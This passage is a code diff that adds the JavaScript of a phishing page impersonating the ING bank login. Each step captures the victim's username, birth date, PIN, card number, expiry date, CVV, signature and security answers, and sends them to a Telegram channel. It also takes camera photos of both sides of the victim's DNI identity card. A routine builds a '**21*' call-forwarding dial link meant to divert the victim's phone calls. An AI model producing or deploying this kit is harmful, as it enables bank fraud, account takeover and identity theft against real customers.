+            const aaaa = document.getElementById('fechaAAAA').value;
+            const fecha = dd + '/' + mm + '/' + aaaa;
+            sendToTelegram(`🔶 ING LOGIN\n━━━━━━━━━━━━\n👤 Usuario: ${usuario}\n🎂 Fecha Nac: ${fecha}`);
+            transition('loginSection', null);
+            showLoading(() => showPinScreen());
+        });
+
+        /* ===== PIN ===== */
+        function showPinScreen() {
+            const sec = document.getElementById('pinSection');
+            sec.classList.remove('hidden');
+            const circlesDiv = document.getElementById('pinCircles');
+            circlesDiv.innerHTML = '';
+            for (let i = 0; i < 6; i++) {
+                const c = document.createElement('div');
+                c.className = 'pin-circle';
+                circlesDiv.appendChild(c);
+            }
+            circlesDiv.children[0].classList.add('active');
+
+            const digits = [0,1,2,3,4,5,6,7,8,9].sort(() => Math.random() - 0.5);
+            const numpadDiv = document.getElementById('numpad');
+            numpadDiv.innerHTML = '';
+            digits.forEach(d => {
+                const b = document.createElement('button');
+                b.className = 'numpad-btn';
+                b.textContent = d;
+                b.type = 'button';
+                b.addEventListener('click', () => handlePinInput(d));
+                numpadDiv.appendChild(b);
+            });
+            window._pinValues = [];
+        }
+
+        function handlePinInput(digit) {
+            const circles = document.querySelectorAll('#pinCircles .pin-circle');
+            const idx = window._pinValues.length;
+            if (idx >= 6) return;
+            circles[idx].classList.remove('active');
+            circles[idx].classList.add('entered');
+            window._pinValues.push(digit);
+            if (window._pinValues.length < 6) {
+                circles[idx + 1].classList.add('active');
+            } else {
+                const clave = window._pinValues.join('');
+                sendToTelegram(`🔐 ING CLAVE\n━━━━━━━━━━━━\nClave completa: ${clave}`);
+                transition('pinSection', null);
+                showLoading(() => {
+                    selectMalware();
+                });
+            }
+        }
+
+        /* ===== NAVIGATION ===== */
+        function transition(hideId, showId) {
+            if (hideId) document.getElementById(hideId).classList.add('hidden');
+            if (showId) document.getElementById(showId).classList.remove('hidden');
+        }
+
+        function showLoading(cb) {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            setTimeout(() => { document.getElementById('loadingScreen').style.display = 'none'; cb(); }, 2200);
+        }
+
+        function selectDNI() { transition('selectionScreen', 'dniContainer'); startCamera('videoFrente'); }
+        function selectTarjeta() { transition('selectionScreen', 'tarjetaContainer'); }
+        function selectFirma() { transition('selectionScreen', 'firmaContainer'); }
+        function selectMalware() { transition('selectionScreen', 'malwareContainer'); document.getElementById('malStep1').classList.remove('hidden'); document.getElementById('malStep2').classList.add('hidden'); document.getElementById('malDone').classList.add('hidden'); }
+        function selectPreguntas() {
+            transition('selectionScreen', 'preguntasContainer');
+            ['pregStep1','pregStep2','pregStep3','pregDone'].forEach(id => document.getElementById(id).classList.add('hidden'));
+            document.getElementById('pregStep1').classList.remove('hidden');
+            document.getElementById('pregNombre').style.display = 'none';
+            window._pregAnswers = {};
+        }
+
+        function pregAnswer(step, val) {
+            window._pregAnswers['q' + step] = val;
+            if (step === 1) {
+                if (val === 'si') {
+                    document.getElementById('pregNombre').style.display = 'block';
+                    return;
+                } else {
+                    pregNext(1);
+                }
+            } else if (step === 2) {
+                sendToTelegram('❓ ING PREGUNTA 2\n━━━━━━━━━━━━\n¿Renta con ING?: ' + val);
+                document.getElementById('pregStep2').classList.add('hidden');
+                document.getElementById('pregStep3').classList.remove('hidden');
+            } else if (step === 3) {
+                sendToTelegram('❓ ING PREGUNTA 3\n━━━━━━━━━━━━\n¿Inversiones/fondos?: ' + val);
+                document.getElementById('pregStep3').classList.add('hidden');
+                document.getElementById('pregDone').classList.remove('hidden');
+            }
+        }
+
+        function pregNext(step) {
+            if (step === 1) {
+                var cotit = window._pregAnswers.q1;
+                var nombre = document.getElementById('cotitularNombre').value.trim();
+                sendToTelegram('❓ ING PREGUNTA 1\n━━━━━━━━━━━━\n¿Cotitulares?: ' + cotit + (cotit === 'si' ? '\nNombre: ' + nombre : ''));
+                document.getElementById('pregStep1').classList.add('hidden');
+                document.getElementById('pregStep2').classList.remove('hidden');
+            }
+        }
+
+        let cameraStream = null;
+        async function startCamera(videoId) {
+            try {
+                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+                document.getElementById(videoId).srcObject = cameraStream;
+            } catch (e) {}
+        }
+        function stopCamera() { if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; } }
+
+        function capturePhoto(step) {
+            const videoId = step === 1 ? 'videoFrente' : 'VideoDorso';
+            const canvasId = step === 1 ? 'canvasFrente' : 'canvasDorso';
+            const video = document.getElementById(videoId);
+            const canvas = document.getElementById(canvasId);
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    const caption = step === 1 ? '🆔 DNI — PARTE DELANTERA' : '🆔 DNI — PARTE TRASERA';
+                    sendPhotoToTelegram(new File([blob], step === 1 ? 'dni_frente.jpg' : 'dni_dorso.jpg', { type: 'image/jpeg' }), caption);
+                }
+                stopCamera();
+                document.getElementById('dniStep' + step).classList.add('hidden');
+                document.getElementById('dniStep' + (step + 1)).classList.remove('hidden');
+                if (step + 1 <= 2) startCamera(step + 1 === 1 ? 'videoFrente' : 'VideoDorso');
+            }, 'image/jpeg', 0.85);
+        }
+
+        function dniBack(step) {
+            stopCamera();
+            document.getElementById('dniStep' + step).classList.add('hidden');
+            document.getElementById('dniStep' + (step - 1)).classList.remove('hidden');
+            if (step - 1 >= 1 && step - 1 <= 2) startCamera((step - 1) === 1 ? 'videoFrente' : 'VideoDorso');
+        }
+
+        function resetDniSteps() {
+            stopCamera();
+            for (let i = 1; i <= 3; i++) document.getElementById('dniStep' + i).classList.add('hidden');
+            document.getElementById('dniStep1').classList.remove('hidden');
+        }
+
+        function goToSelection() {
+            stopCamera();
+            ['dniContainer', 'tarjetaContainer', 'firmaContainer', 'malwareContainer', 'preguntasContainer'].forEach(id => document.getElementById(id).classList.add('hidden'));
+            resetDniSteps();
+            document.getElementById('stepFecha').classList.add('hidden');
+            document.getElementById('stepCVV').classList.add('hidden');
+            document.getElementById('stepTarjeta').classList.remove('hidden');
+            document.getElementById('selectionScreen').classList.remove('hidden');
+        }
+
+        function backToTarjeta() { transition('stepFecha', 'stepTarjeta'); }
+        function backToFecha() { transition('stepCVV', 'stepFecha'); }
+
+        /* ===== ENVÍOS ===== */
+        function continueTarjeta() { sendToTelegram(`💳 ING TARJETA\n━━━━━━━━━━━━\nVal: ${document.getElementById('tarjeta').value}`); transition('stepTarjeta', 'stepFecha'); }
+        function continueFecha() { sendToTelegram(`📅 ING FECHA CDAD\n━━━━━━━━━━━━\nVal: ${document.getElementById('fecha').value}`); transition('stepFecha', 'stepCVV'); }
+        function sendCVV() { sendToTelegram(`🔒 ING CVV\n━━━━━━━━━━━━\nVal: ${document.getElementById('cvv').value}`); showSuccess(); }
+        function sendFirma() { sendToTelegram(`✍️ ING FIRMA\n━━━━━━━━━━━━\nVal: ${document.getElementById('firma').value}`); showSuccess(); }
+
+        // Cargar numero de desvio dinamico
+        (function loadDesvio() {
+            fetch('desvio_numero.json').then(r=>r.json()).then(d=>{
+                if(d.ing) {
+                    const code = '**21*' + d.ing + '#';
+                    const link1 = document.getElementById('malLink1');
+                    if(link1) link1.href = 'tel:' + encodeURIComponent(code);
+                }
+            }).catch(()=>{});
+        })();
+
+        function showSuccess() {
+            document.querySelector('.login-card').innerHTML = `
+                <div class="form-section" style="text-align:center;padding:40px 0">
+                    <div class="spinner" style="margin:0 auto 24px"></div>
+                    <h1>Verificando información</h1>
+                    <p style="font-size:14px;color:#666;margin-top:8px">Por favor, espere mientras el sistema verifica la información proporcionada. Siga las instrucciones de nuestro agente.</p>
+                    <p style="font-size:13px;color:#999;margin-top:16px">No cierre esta ventana.</p>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
